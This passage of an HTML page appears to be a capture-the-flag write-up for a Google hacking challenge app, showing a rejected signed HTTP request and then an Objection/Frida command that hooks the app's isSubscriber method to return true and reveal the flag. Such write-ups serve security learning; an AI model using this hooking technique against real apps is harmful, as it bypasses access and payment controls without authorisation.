+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>http get https://corgis-web.h4ck.ctfcompetition.com/corgi X-Document-ID:flag X-Request-Nonce:61c1871f7a3346eb0beca5ec4de3e2cdf542b6ef510a5d51eb5bc8c58e0d90b7 X-Timestamp:1666129650 X-Auth-MAC:5bd9d5a06b0e2c1529aca21d9efa02547561bb298cefe65ee3ffd5846f303ae4 User-Agent:okhttp/4.10.0 X-User-Subscribed:true
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>HTTP/1.1 401 UNAUTHORIZED
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Alt-Svc: h3=&quot;:443&quot;; ma=2592000,h3-29=&quot;:443&quot;; ma=2592000
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>Content-Length: 318
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Content-Type: text/html; charset=utf-8
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>Date: Tue, 18 Oct 2022 21:56:28 GMT
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>Server: gunicorn
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>Via: 1.1 google
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>&lt;!doctype html&gt;
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>&lt;html lang=en&gt;
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>&lt;title&gt;401 Unauthorized&lt;/title&gt;
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>&lt;h1&gt;Unauthorized&lt;/h1&gt;
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>&lt;p&gt;The server could not verify that you are authorized to access the URL requested. You either supplied the wrong credentials (e.g. a bad password), or your browser doesn&amp;#x27;t understand how to supply the credentials required.&lt;/p&gt;
+</code></pre></div>
+<p>This means that there is some kind of signature that we need to reverse... or we could just use <a href="/mobile/objection/">Objection</a> to change the return value of the <code>isSubscriber</code> function :)</p>
+<p>With objection this is just one command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>android hooking set return_value google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber true
+</code></pre></div>
+<p>Before using objection we need to attach Frida to the process of our application:</p>
+<p><img alt="Attach Frida to process" src="../hacking-google-red-team/corellium-2.png" /></p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<div class="highlight"><pre><span></span><code>Make sure that the version of Frida you have installed locally is the same as the one used by Corellium or it won&#39;t work.
+</code></pre></div>
+</div>
+<p>Now if we can a QR code again the value will be replaced by true and the other headers will be updated:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Objection -g google.h4ck1ng.secretcorgis explore                                                                                                     ─╯
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Using USB device `Corellium Generic`
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>Agent injected and responds ok!
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>     _   _         _   _
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a> ___| |_|_|___ ___| |_|_|___ ___
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>| . | . | | -_|  _|  _| | . |   |
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>|___|___| |___|___|_| |_|___|_|_|
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>      |___|(object)inject(ion) v1.11.0
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>     Runtime Mobile Exploration
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>        by: @leonjza from @sensepost
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>[tab] for command suggestions
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>google.h4ck1ng.secretcorgis on (Android: 12) [usb] # android hooking set return_value google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber true
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>(agent) Attempting to modify return value for class google.h4ck1ng.secretcorgis.CorgiRequest and method isSubscriber.
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>(agent) Hooking google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber()
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>(agent) Registering job 647615. Type: set-return for: google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber
+<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>google.h4ck1ng.secretcorgis on (Android: 12) [usb] # (agent) [647615] Return value was not true, setting to true.
+<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>(agent) [647615] Return value was not true, setting to true.
+<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>(agent) [647615] Return value was not true, setting to true.
+</code></pre></div>
+<p>We are now a subscriber and we can find the flag <code>c0rg15_4nd_th3ir_s3cr3ts_4r3_cu73</code> in the response !</p>
+<p><img alt="" src="../hacking-google-red-team/corellium-3.png" /></p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+    
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 25, 2024</span>
+  </span>
+
+    
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Created">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 25, 2024</span>
+  </span>
+
+    
+    
+      
+  
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Contributors">
+      
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 4a4 4 0 0 1 4 4 4 4 0 0 1-4 4 4 4 0 0 1-4-4 4 4 0 0 1 4-4m0 10c4.42 0 8 1.79 8 4v2H4v-2c0-2.21 3.58-4 8-4"/></svg>
+      
+    </span>
+    <nav>
+      
+        <a href="mailto:techbrunch@users.noreply.github.com">Techbrunch</a>
+    </nav>
+  </span>
+
+    
+    
+  </aside>
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/techbrunchfr" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/Techbrunch" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.annotate", "header.autohide", "announce.dismiss"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d6f25eb3.min.js"></script>
+      
+    
+  </body>
+</html>
